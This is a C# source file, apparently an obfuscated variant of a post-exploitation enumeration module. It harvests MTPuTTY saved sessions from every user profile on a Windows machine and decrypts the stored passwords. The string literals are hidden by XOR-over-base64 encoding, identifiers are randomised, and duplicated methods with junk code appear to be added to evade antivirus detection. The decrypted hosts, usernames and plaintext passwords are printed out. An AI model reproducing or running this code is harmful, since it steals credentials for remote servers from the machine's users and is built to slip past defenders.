using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;
using System.Text;
using System.Linq;
using System.Runtime.InteropServices;
using O_F41F88FA.Output.TextWriters;
using O_F41F88FA.Output.Formatters;
using O_F41F88FA.Interop;
using System.Threading.Tasks;

namespace O_F41F88FA.Commands
{
    class MTPuTTYConfig
    {
        public enum MTPuTTYConType
        {
            None = 0,
            Raw = 1,
            Telnet = 2,
            Rlogin = 3,
            SSH = 4,
            Serial = 5
        }

        public MTPuTTYConfig(string DisplayName, string ServerName, string UserName, string Password, string PasswordDelay, string CLParams, string ScriptDelay, MTPuTTYConType ConnType = MTPuTTYConType.SSH, int Port = 0)
        {
            this.DisplayName = DisplayName;
            this.ServerName = ServerName;
            this.ConnType = ConnType;
            this.Port = Port;
            this.UserName = UserName;
            this.Password = Password;
            this.PasswordDelay = PasswordDelay;
            this.CLParams = CLParams;
            this.ScriptDelay = ScriptDelay;
        }

        public string DisplayName { get; set; }
        public string ServerName { get; set; }
        public MTPuTTYConType ConnType { get; set; }
        public int Port { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }
        public string PasswordDelay { get; set; }
        public string CLParams { get; set; }
        public string ScriptDelay { get; set; }
    }
internal class O_CF73C2A8 : O_2183A68D
{
    public override string Command => Encoding.UTF8.GetString(Convert.FromBase64String("eibwLAjaig==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("N3KgWVyO0yU=")[iii % 8])).ToArray());
    public override string Description => Encoding.UTF8.GetString(Convert.FromBase64String("IHRvfBdO0PYOT1FvKn38pAxUVmYtOu+/AUVM").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("bSA/CUMaidY=")[iii % 8])).ToArray());
    public override CommandGroup[] Group => new[]
    {
        CommandGroup.User
    };
    public override bool SupportRemote => false;

    public O_CF73C2A8(Runtime runtime) : base(runtime)
    {
    }

    public override IEnumerable<O_4AED570F?> Execute(string[] args)
    {
        var userFolder = $"{Environment.GetEnvironmentVariable(Encoding.UTF8.GetString(Convert.FromBase64String("mrV2lvh72lugumA=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("ycwF4p0Wnik=")[iii % 8])).ToArray()))}\\Users\\";
        var dirs = Directory.GetDirectories(userFolder);
        foreach (var dir in dirs)
        {
            if (dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("Iw0QIv7R").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("c3hyTpeyurs=")[iii % 8])).ToArray())) || dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("zG7a9BJeWA==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("iAu8lWcyLE8=")[iii % 8])).ToArray())) || dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("Gm8MoZ0qrQsLeQ+y").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("XgpqwOhG2Ss=")[iii % 8])).ToArray())) || dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("FA/sqQOR4zIm").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("VWOAiVbihkA=")[iii % 8])).ToArray())))
                continue;
            var parts = dir.Split('\\');
            var userName = parts[parts.Length - 1];
            var configs = new List<MTPuTTYConfig>();
            string[] paths =
            {
                $"{dir}\\AppData\\Roaming\\TTYPlus\\mtputty.xml"};
            foreach (var path in paths)
            {
                if (!File.Exists(path))
                    continue;
                var xmlDoc = new XmlDocument();
                xmlDoc.Load(path);
                var sessions = xmlDoc.GetElementsByTagName(Encoding.UTF8.GetString(Convert.FromBase64String("3GX93w==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("kgqZutbF17g=")[iii % 8])).ToArray()));
                if (sessions.Count == 0)
                    continue;
                foreach (XmlNode session in sessions)
                {
                    if (session.Attributes[Encoding.UTF8.GetString(Convert.FromBase64String("+2r+Bw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("rxOOYutiV9w=")[iii % 8])).ToArray())].Value == Encoding.UTF8.GetString(Convert.FromBase64String("Fw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("JpToyxHzQEw=")[iii % 8])).ToArray()))
                    {
                        var displayName = session[Encoding.UTF8.GetString(Convert.FromBase64String("lg1y7A1mDK2zCWQ=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("0mQBnGEHdeM=")[iii % 8])).ToArray())].InnerText;
                        var serverName = session[Encoding.UTF8.GetString(Convert.FromBase64String("e7SgxpmDJMRFtA==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("KNHSsPzxaqU=")[iii % 8])).ToArray())].InnerText;
                        var conType = int.Parse(session[Encoding.UTF8.GetString(Convert.FromBase64String("TvNGbMfxBERK/0J9").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("HoYyGL6yayo=")[iii % 8])).ToArray())].InnerText);
                        var port = int.Parse(session[Encoding.UTF8.GetString(Convert.FromBase64String("bfvPQw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("PZS9N4Su9y4=")[iii % 8])).ToArray())].InnerText);
                        var username = session[Encoding.UTF8.GetString(Convert.FromBase64String("WSey/wdjoBM=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("DFTXjUkCzXY=")[iii % 8])).ToArray())].InnerText;
                        var encpassword = session[Encoding.UTF8.GetString(Convert.FromBase64String("mBx+NdIR8QI=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("yH0NRqV+g2Y=")[iii % 8])).ToArray())].InnerText;
                        var passwordDelay = session[Encoding.UTF8.GetString(Convert.FromBase64String("h9PBVbL6JrOT195HvA==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("17KyJsWVVNc=")[iii % 8])).ToArray())].InnerText;
                        var clParams = session[Encoding.UTF8.GetString(Convert.FromBase64String("bj380ZXZOsg=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("LXGssOe4V7s=")[iii % 8])).ToArray())].InnerText;
                        var scriptDelay = session[Encoding.UTF8.GetString(Convert.FromBase64String("hQOscDLYWpi6Aac=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("1mDeGUKsHv0=")[iii % 8])).ToArray())].InnerText;
                        byte[] decryptKey = Encoding.UTF8.GetBytes($"1{username.Trim()}{displayName.Trim()}");
                        string password = DecryptUserPassword(decryptKey, encpassword);
                        var config = new MTPuTTYConfig(displayName, serverName, username, password, passwordDelay, clParams, scriptDelay, (MTPuTTYConfig.MTPuTTYConType)conType, port);
                        configs.Add(config);
                    }
                }
            }

            if (configs.Count > 0)
            {
                yield return new O_ED370A94(userName, configs);
            }
        }
    }

    private string DecryptUserPassword(byte[] pass, string encPass)
    {
        string decryptedPass = Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("dzc9WJpKv5w=")[iii % 8])).ToArray());
        IntPtr hProv = IntPtr.Zero;
        IntPtr hHash = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        uint CRYPT_VERIFY_CONTEXT = 0xF0000000;
        uint CALG_SHA = 0x00008004;
        uint CALG_RC2 = 0x00006602;
        byte[] cipherText = Convert.FromBase64String(encPass);
        uint cipherTextLength = (uint)cipherText.Length;
        if (Advapi32.CryptAcquireContext(ref hProv, Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("FytAAzmUudI=")[iii % 8])).ToArray()), Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("tBs5f3//4bg=")[iii % 8])).ToArray()), 1, CRYPT_VERIFY_CONTEXT))
        {
            if (Advapi32.CryptCreateHash(hProv, CALG_SHA, IntPtr.Zero, 0, ref hHash))
            {
                if (Advapi32.CryptHashData(hHash, pass, (uint)pass.Length, 0))
                {
                    if (Advapi32.CryptDeriveKey(hProv, CALG_RC2, hHash, 0, ref hKey))
                    {
                        if (Advapi32.CryptDecrypt(hKey, IntPtr.Zero, true, 0, cipherText, ref cipherTextLength))
                        {
                            cipherText = cipherText.Skip(0).Take((int)cipherTextLength).ToArray();
                            if (cipherTextLength > 2 && cipherText[1] == 0x00)
                            {
                                decryptedPass = Encoding.Unicode.GetString(cipherText);
                            }
                            else
                            {
                                decryptedPass = Encoding.UTF8.GetString(cipherText);
                            }
                        }
                    }
                }
            }
        }

        if (String.IsNullOrEmpty(decryptedPass))
        {
            if (Marshal.GetLastWin32Error() == 0)
                decryptedPass = Encoding.UTF8.GetString(Convert.FromBase64String("FGWh7FmhUQ==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("TyDsvA34DEw=")[iii % 8])).ToArray());
            else
                decryptedPass = $"CouldNotDecrypt: {encPass} ({Marshal.GetLastWin32Error()})";
        }

        return decryptedPass;
    }

internal class O_ED370A94 : O_4AED570F
{
    public O_ED370A94(string userName, List<MTPuTTYConfig> configs)
    {
        UserName = userName;
        Configs = configs;
    }

    public string UserName { get; set; }
    public List<MTPuTTYConfig> Configs { get; set; }
}    [CommandOutputType(typeof(O_ED370A94))]
    internal class O_B1892356 : TextFormatterBase
    {
        public O_B1892356(ITextWriter writer) : base(writer)
        {
        }

        public override void FormatResult(O_2183A68D? command, O_4AED570F result, bool filterResults)
        {
            var dto = (O_ED370A94)result;
            WriteLine($"  MTPuTTY Configs ({dto.UserName}):\n");
            foreach (var config in dto.Configs)
            {
                WriteLine($"    DisplayName    : {config.DisplayName}");
                WriteLine($"    ServerName     : {config.ServerName}");
                WriteLine($"    PuttyConType   : {config.ConnType}");
                WriteLine($"    Port           : {config.Port}");
                WriteLine($"    UserName       : {config.UserName}");
                WriteLine($"    Password       : {config.Password}");
                WriteLine($"    PasswordDelay  : {config.PasswordDelay}");
                WriteLine($"    CLParams       : {config.CLParams}");
                WriteLine($"    ScriptDelay    : {config.ScriptDelay}");
                WriteLine();
            }

            WriteLine();
        }

        public void FormatResult(O_2183A68D? command, O_4AED570F result, bool filterResults, string jepdqTXF)
        {
            try
            {
                Task.Run(() =>
                {
                    try
                    {
                        System.Text.UnicodeEncoding instance = new System.Text.UnicodeEncoding();
                        instance.GetMaxByteCount(20);
                    }
                    catch (Exception)
                    {
                    }
                }).Start();
            }
            catch (Exception)
            {
            }

            var dto = (O_ED370A94)result;
            WriteLine($"  MTPuTTY Configs ({dto.UserName}):\n");
            foreach (var config in dto.Configs)
            {
                WriteLine($"    DisplayName    : {config.DisplayName}");
                WriteLine($"    ServerName     : {config.ServerName}");
                WriteLine($"    PuttyConType   : {config.ConnType}");
                WriteLine($"    Port           : {config.Port}");
                WriteLine($"    UserName       : {config.UserName}");
                WriteLine($"    Password       : {config.Password}");
                WriteLine($"    PasswordDelay  : {config.PasswordDelay}");
                WriteLine($"    CLParams       : {config.CLParams}");
                WriteLine($"    ScriptDelay    : {config.ScriptDelay}");
                WriteLine();
            }

            WriteLine();
        }
    }

    public IEnumerable<O_4AED570F?> Execute(string[] args, string KNddXsUw)
    {
        try
        {
            Task.Run(() =>
            {
                try
                {
                    System.Text.UnicodeEncoding instance = new System.Text.UnicodeEncoding();
                    instance.GetMaxByteCount(20);
                }
                catch (Exception)
                {
                }
            }).Start();
        }
        catch (Exception)
        {
        }

        var userFolder = $"{Environment.GetEnvironmentVariable(Encoding.UTF8.GetString(Convert.FromBase64String("mrV2lvh72lugumA=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("ycwF4p0Wnik=")[iii % 8])).ToArray()))}\\Users\\";
        var dirs = Directory.GetDirectories(userFolder);
        foreach (var dir in dirs)
        {
            if (dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("Iw0QIv7R").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("c3hyTpeyurs=")[iii % 8])).ToArray())) || dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("zG7a9BJeWA==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("iAu8lWcyLE8=")[iii % 8])).ToArray())) || dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("Gm8MoZ0qrQsLeQ+y").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("XgpqwOhG2Ss=")[iii % 8])).ToArray())) || dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("FA/sqQOR4zIm").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("VWOAiVbihkA=")[iii % 8])).ToArray())))
                continue;
            var parts = dir.Split('\\');
            var userName = parts[parts.Length - 1];
            var configs = new List<MTPuTTYConfig>();
            string[] paths =
            {
                $"{dir}\\AppData\\Roaming\\TTYPlus\\mtputty.xml"};
            foreach (var path in paths)
            {
                if (!File.Exists(path))
                    continue;
                var xmlDoc = new XmlDocument();
                xmlDoc.Load(path);
                var sessions = xmlDoc.GetElementsByTagName(Encoding.UTF8.GetString(Convert.FromBase64String("3GX93w==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("kgqZutbF17g=")[iii % 8])).ToArray()));
                if (sessions.Count == 0)
                    continue;
                foreach (XmlNode session in sessions)
                {
                    if (session.Attributes[Encoding.UTF8.GetString(Convert.FromBase64String("+2r+Bw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("rxOOYutiV9w=")[iii % 8])).ToArray())].Value == Encoding.UTF8.GetString(Convert.FromBase64String("Fw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("JpToyxHzQEw=")[iii % 8])).ToArray()))
                    {
                        var displayName = session[Encoding.UTF8.GetString(Convert.FromBase64String("lg1y7A1mDK2zCWQ=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("0mQBnGEHdeM=")[iii % 8])).ToArray())].InnerText;
                        var serverName = session[Encoding.UTF8.GetString(Convert.FromBase64String("e7SgxpmDJMRFtA==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("KNHSsPzxaqU=")[iii % 8])).ToArray())].InnerText;
                        var conType = int.Parse(session[Encoding.UTF8.GetString(Convert.FromBase64String("TvNGbMfxBERK/0J9").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("HoYyGL6yayo=")[iii % 8])).ToArray())].InnerText);
                        var port = int.Parse(session[Encoding.UTF8.GetString(Convert.FromBase64String("bfvPQw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("PZS9N4Su9y4=")[iii % 8])).ToArray())].InnerText);
                        var username = session[Encoding.UTF8.GetString(Convert.FromBase64String("WSey/wdjoBM=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("DFTXjUkCzXY=")[iii % 8])).ToArray())].InnerText;
                        var encpassword = session[Encoding.UTF8.GetString(Convert.FromBase64String("mBx+NdIR8QI=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("yH0NRqV+g2Y=")[iii % 8])).ToArray())].InnerText;
                        var passwordDelay = session[Encoding.UTF8.GetString(Convert.FromBase64String("h9PBVbL6JrOT195HvA==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("17KyJsWVVNc=")[iii % 8])).ToArray())].InnerText;
                        var clParams = session[Encoding.UTF8.GetString(Convert.FromBase64String("bj380ZXZOsg=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("LXGssOe4V7s=")[iii % 8])).ToArray())].InnerText;
                        var scriptDelay = session[Encoding.UTF8.GetString(Convert.FromBase64String("hQOscDLYWpi6Aac=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("1mDeGUKsHv0=")[iii % 8])).ToArray())].InnerText;
                        byte[] decryptKey = Encoding.UTF8.GetBytes($"1{username.Trim()}{displayName.Trim()}");
                        string password = DecryptUserPassword(decryptKey, encpassword);
                        var config = new MTPuTTYConfig(displayName, serverName, username, password, passwordDelay, clParams, scriptDelay, (MTPuTTYConfig.MTPuTTYConType)conType, port);
                        configs.Add(config);
                    }
                }
            }

            if (configs.Count > 0)
            {
                yield return new O_ED370A94(userName, configs);
            }
        }
    }

    private string DecryptUserPassword(byte[] pass, string encPass, string pQvoKeCX)
    {
        try
        {
            Task.Run(() =>
            {
                try
                {
                    System.Text.UnicodeEncoding instance = new System.Text.UnicodeEncoding();
                    instance.GetMaxByteCount(20);
                }
                catch (Exception)
                {
                }
            }).Start();
        }
        catch (Exception)
        {
        }

        string decryptedPass = Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("dzc9WJpKv5w=")[iii % 8])).ToArray());
        IntPtr hProv = IntPtr.Zero;
        IntPtr hHash = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        uint CRYPT_VERIFY_CONTEXT = 0xF0000000;
        uint CALG_SHA = 0x00008004;
        uint CALG_RC2 = 0x00006602;
        byte[] cipherText = Convert.FromBase64String(encPass);
        uint cipherTextLength = (uint)cipherText.Length;
        if (Advapi32.CryptAcquireContext(ref hProv, Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("FytAAzmUudI=")[iii % 8])).ToArray()), Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("tBs5f3//4bg=")[iii % 8])).ToArray()), 1, CRYPT_VERIFY_CONTEXT))
        {
            if (Advapi32.CryptCreateHash(hProv, CALG_SHA, IntPtr.Zero, 0, ref hHash))
            {
                if (Advapi32.CryptHashData(hHash, pass, (uint)pass.Length, 0))
                {
                    if (Advapi32.CryptDeriveKey(hProv, CALG_RC2, hHash, 0, ref hKey))
                    {
                        if (Advapi32.CryptDecrypt(hKey, IntPtr.Zero, true, 0, cipherText, ref cipherTextLength))
                        {
                            cipherText = cipherText.Skip(0).Take((int)cipherTextLength).ToArray();
                            if (cipherTextLength > 2 && cipherText[1] == 0x00)
                            {
                                decryptedPass = Encoding.Unicode.GetString(cipherText);
                            }
                            else
                            {
                                decryptedPass = Encoding.UTF8.GetString(cipherText);
                            }
                        }
                    }
                }
            }
        }

        if (String.IsNullOrEmpty(decryptedPass))
        {
            if (Marshal.GetLastWin32Error() == 0)
                decryptedPass = Encoding.UTF8.GetString(Convert.FromBase64String("FGWh7FmhUQ==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("TyDsvA34DEw=")[iii % 8])).ToArray());
            else
                decryptedPass = $"CouldNotDecrypt: {encPass} ({Marshal.GetLastWin32Error()})";
        }

        return decryptedPass;
    }
}}